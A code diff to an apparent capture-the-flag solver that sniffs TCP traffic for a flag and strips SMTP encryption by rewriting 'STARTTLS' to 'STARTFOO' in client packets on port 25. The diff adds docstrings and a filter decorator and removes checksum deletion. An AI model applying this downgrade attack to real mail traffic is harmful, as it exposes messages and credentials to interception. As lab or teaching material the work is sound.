@@ -18,6 +18,7 @@ class Strategy(strategy.Strategy):
     challenges = ['letter']
 
     class AnalysisModule(capture.Module):
+        """AnalysisModule looks at any TCP packet with a payload for the flag and stops the sniffer when it is found"""
         def __init__(self, flagpattern):
             self.flagpattern = flagpattern
             self.flag = None
@@ -40,15 +41,13 @@ class Strategy(strategy.Strategy):
                     self.flag = m.group(0)
                     self.sniffer.stop()
 
+    @capture.tcpfilter
     @staticmethod
     def corrupttls(pkt):
+        """corrupttls looks for an SMTP client packet with `STARTTLS` and replaces it with `STARTFOO`"""
         if all(layer in pkt for layer in (scapy.IP, scapy.TCP, scapy.Raw)):
             if pkt[scapy.TCP].dport == 25 and b'STARTTLS' in pkt[scapy.Raw].load:
                 pkt.load = pkt[scapy.Raw].load.replace(b'STARTTLS', b'STARTFOO')
-
-                # Delete the checksums. Scapy will recalculate them on send.
-                del pkt[scapy.IP].chksum
-                del pkt[scapy.TCP].chksum
         return pkt
         
 
